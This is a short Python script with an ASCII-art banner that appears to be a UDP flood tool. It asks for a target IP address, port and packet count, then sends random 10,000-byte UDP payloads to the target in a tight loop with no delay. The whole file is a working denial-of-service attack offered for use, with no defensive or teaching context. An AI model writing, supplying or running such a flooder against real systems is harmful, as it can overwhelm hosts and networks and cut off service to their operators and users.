import socket
import random
import time


text = ('''
██╗   ██╗██████╗ ██╗
██║   ██║██╔══██╗██║
██║   ██║██████╔╝██║
╚██╗ ██╔╝██╔══██╗██║
 ╚████╔╝ ██║  ██║██║
  ╚═══╝  ╚═╝  ╚═╝╚═╝

''') 



print(text)






s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
ip = input("Target IP: ")
port = int(input("Target Port: "))
los = int(input("Nuber of packets: "))
sleep = 0

s.connect((ip, port))   

for i in range(1, los):
  s.send(random._urandom(10) * 1000)
  print(f"Send: {i}", end='\r')
  time.sleep(sleep)
